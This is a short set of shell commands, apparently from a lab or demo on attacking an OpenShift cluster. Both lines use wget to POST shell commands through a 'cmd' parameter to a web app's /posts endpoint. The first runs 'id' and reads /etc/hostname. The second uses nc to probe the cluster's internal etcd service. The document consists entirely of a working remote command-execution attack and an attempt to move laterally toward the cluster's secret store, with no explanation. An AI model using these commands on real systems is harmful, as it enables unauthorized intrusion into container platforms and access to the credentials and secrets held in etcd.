wget -q -O - --post-data 'cmd=id && cat /etc/hostname' http://santablog-northpole.apps.ocp.ralvares.com/posts

echo "Connecting to ETCD on openshift-etcd namespace..." && wget -q -O - --post-data 'cmd=nc etcd.openshift-etcd:2379 && echo Success' http://santablog-northpole.apps.ocp.ralvares.com/posts && echo Success
